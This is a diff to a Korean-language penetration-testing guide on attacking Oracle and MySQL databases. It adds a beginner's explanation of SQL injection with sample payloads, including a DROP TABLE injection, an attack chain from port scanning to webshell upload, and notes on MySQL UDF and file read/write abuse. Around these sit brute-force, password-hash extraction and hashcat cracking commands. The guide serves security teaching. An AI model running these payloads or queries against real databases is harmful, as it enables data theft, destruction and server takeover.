@@ -6,6 +6,72 @@
 
 # Oracle / MySQL 공격 기법
 
+## 0. 초보자를 위한 개념 이해
+
+### 데이터베이스 해킹이란?
+
+**데이터베이스(DB) 해킹**은 데이터베이스 시스템에 무단으로 접근하거나, SQL 인젝션 등의 기법을 통해 데이터를 탈취하거나 시스템을 장악하는 공격입니다.
+
+```
+데이터베이스가 공격자에게 매력적인 이유:
+  ✓ 모든 중요 데이터가 집중됨
+    (고객 정보, 금융 데이터, 자격증명, 비밀번호)
+  ✓ 웹 애플리케이션과 직접 연결됨
+    (SQLi 공격으로 우회 가능)
+  ✓ 파일 읽기/쓰기 기능으로 OS 접근 가능
+    (MySQL의 LOAD_FILE, INTO OUTFILE)
+  ✓ 저장 프로시저로 OS 명령 실행 가능
+    (MSSQL의 xp_cmdshell)
+```
+
+### SQL 인젝션 기초 (꼭 알아야 할 개념)
+
+**SQL 인젝션(SQLi)**은 사용자 입력이 SQL 쿼리에 직접 포함될 때 발생하는 취약점입니다.
+
+```
+취약한 코드 (PHP 예시):
+  $query = "SELECT * FROM users WHERE name = '" + $_GET['name'] + "'";
+  
+정상 입력: name = "홍길동"
+  → SELECT * FROM users WHERE name = '홍길동'
+  
+공격 입력: name = "' OR '1'='1"
+  → SELECT * FROM users WHERE name = '' OR '1'='1'
+  → 조건이 항상 참 → 모든 사용자 반환!
+  
+공격 입력 2: name = "'; DROP TABLE users; --"
+  → SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
+  → users 테이블 삭제!
+```
+
+### DB 해킹 공격 체인
+
+```
+1단계: 탐색
+  - 웹 애플리케이션에서 SQLi 취약점 발견
+  - 또는 직접 DB 포트 스캔 (1521, 3306, 1433, 5432)
+  
+2단계: 초기 접근
+  - SQLi로 웹 앱 우회
+  - 기본 계정/약한 비밀번호 (admin/admin, root/root)
+  - 노출된 DB 포트에 직접 접속
+  
+3단계: 정보 수집
+  - 데이터베이스 버전, 설치 경로
+  - 테이블 목록, 컬럼 구조
+  - 사용자 계정 및 권한
+  
+4단계: 데이터 탈취
+  - 민감한 테이블에서 데이터 추출
+  - 자격증명 해시 덤프 → 오프라인 크래킹
+
+5단계: 권한 상승 (선택적)
+  - 파일 읽기/쓰기로 웹쉘 업로드
+  - OS 명령 실행으로 서버 장악
+```
+
+---
+
 ## 1. DB 해킹 개요
 
 ```
@@ -45,7 +111,7 @@ msfconsole -q -x "use auxiliary/scanner/oracle/sid_enum; \
 
 ### 2-2. Oracle 기본 계정 브루트포스
 
-Oracle 데이터베이스 취약점을 점검하는 명령어입니다. TNS 리스너 설정과 기본 계정 사용 여부를 확인합니다.
+**Oracle 기본 계정 목록 (반드시 변경해야 함):**
 
 ```bash
 # Metasploit Oracle 로그인 브루트포스
@@ -72,7 +138,6 @@ Oracle 주요 기본 계정:
 ### 2-3. Oracle SQLi → OS 명령 실행
 
 
-데이터베이스 정보 수집 SQL 쿼리입니다. 사용자 목록, 부여된 권한, 설치된 패키지 등을 조회하여 권한 상승 가능성과 공격 경로를 분석합니다.
 
 ```sql
 -- UTL_FILE로 파일 읽기
@@ -106,7 +171,6 @@ SELECT DBMS_JAVA.RUNJAVA(
 ### 2-4. Oracle 패스워드 해시 추출 및 크랙
 
 
-데이터베이스 정보 수집 SQL 쿼리입니다. 사용자 목록, 부여된 권한, 설치된 패키지 등을 조회하여 권한 상승 가능성과 공격 경로를 분석합니다.
 
 ```sql
 -- Oracle 11g 이하 — DES 기반 해시
@@ -116,7 +180,7 @@ SELECT username, password FROM sys.user$ WHERE type# = 1;
 SELECT name, spare4 FROM sys.user$ WHERE type# = 1;
 ```
 
-Oracle 데이터베이스 취약점을 점검하는 명령어입니다. TNS 리스너 설정과 기본 계정 사용 여부를 확인합니다.
+**Oracle 기본 계정 목록 (반드시 변경해야 함):**
 
 ```bash
 # Hashcat으로 Oracle 11g 해시 크랙
@@ -148,10 +212,23 @@ hashcat -m 12300 oracle12_hashes.txt rockyou.txt
 
 ## 3. MySQL 공격
 
+### MySQL 공격 개요
+
+**MySQL을 공격하는 이유:**
+```
+MySQL은 세계에서 가장 널리 사용되는 오픈소스 DB
+→ 많은 웹 앱이 MySQL과 연동됨
+→ SQLi 취약점 → MySQL 접근 → OS 장악 가능
+
+MySQL의 위험한 기능들:
+  FILE 권한: LOAD_FILE(), INTO OUTFILE → 파일 시스템 접근
+  UDF: 사용자 정의 함수 → OS 명령 실행
+  Event/Trigger: 자동 실행 코드 → 지속성 확보
+```
+
 ### 3-1. MySQL 정보 수집
 
-
-MySQL 클라이언트로 접속하고 기본 정보를 수집합니다. `show databases`, `show grants`, `@@global.secure_file_priv` 등을 확인하여 파일 읽기/쓰기 권한과 데이터 덤프 가능성을 평가합니다.
+**초기 접속 후 반드시 확인할 항목:**
 
 ```bash
 # nmap MySQL 스캔
@@ -164,8 +241,14 @@ nmap -p 3306 --script mysql-brute <target>
 
 ### 3-2. MySQL UDF(User Defined Function)를 통한 OS 명령 실행
 
+**UDF란?** MySQL에서 C/C++로 만든 공유 라이브러리(.so/.dll)를 플러그인으로 등록해 SQL에서 사용자 정의 함수를 실행하는 기능입니다.
 
-데이터베이스 정보 수집 SQL 쿼리입니다. 사용자 목록, 부여된 권한, 설치된 패키지 등을 조회하여 권한 상승 가능성과 공격 경로를 분석합니다.
+**공격 조건:**
+```
+필요 권한: FILE 권한 + INSERT 권한 (또는 DBA)
+plugin_dir 쓰기 가능 여부 확인 필요
+MySQL 서비스 계정 권한에 따라 OS 명령 실행 범위 달라짐
+```
 
 ```sql
 -- 1단계: UDF 공유 라이브러리 업로드
@@ -223,8 +306,21 @@ if __name__ == "__main__":
 
 ### 3-3. MySQL 파일 읽기/쓰기
 
-
-데이터베이스 정보 수집 SQL 쿼리입니다. 사용자 목록, 부여된 권한, 설치된 패키지 등을 조회하여 권한 상승 가능성과 공격 경로를 분석합니다.
+**MySQL의 파일 접근 기능:**
+```
+LOAD_FILE(path):
+  DB 서버의 파일 내용 읽기
+  필요 조건: FILE 권한 + 파일이 world-readable
+  
+INTO OUTFILE / INTO DUMPFILE:
+  쿼리 결과를 파일로 저장
+  필요 조건: FILE 권한 + 대상 경로 쓰기 가능
+  보안 설정: secure_file_priv 변수로 제한 가능
+  
+실제 공격 시나리오:
+  SQLi 발견 → FILE 권한 있는 계정으로 접근 →
+  웹 루트에 PHP 쉘 파일 쓰기 → 웹쉘로 OS 명령 실행
+```
 
 ```sql
 -- 파일 읽기 (FILE 권한 필요)
@@ -242,8 +338,12 @@ SHOW VARIABLES LIKE 'secure_file_priv';
 
 ### 3-4. MySQL 해시 추출 및 크랙
 
-
-데이터베이스 정보 수집 SQL 쿼리입니다. 사용자 목록, 부여된 권한, 설치된 패키지 등을 조회하여 권한 상승 가능성과 공격 경로를 분석합니다.
+**MySQL 비밀번호 저장 방식의 변화:**
+```
+MySQL 4.x: MySQL323 (매우 약함, 짧은 해시)
+MySQL 5.x: MySQL41 = SHA1(SHA1(password)) (더 안전)
+MySQL 8.x: caching_sha2_password 또는 sha256_password
+```
 
 ```sql
 -- MySQL 5.x 이하
@@ -253,7 +353,7 @@ SELECT user, password FROM mysql.user;
 SELECT user, authentication_string FROM mysql.user;
 ```
 
-MySQL/MariaDB 보안 설정을 점검합니다. 원격 root 접속 허용, 빈 비밀번호 계정, 불필요한 권한 등을 확인합니다.
+**크래킹 명령어:**
 
 ```bash
 # MySQL 4.x/5.x (MySQL323 / MySQL41 해시)
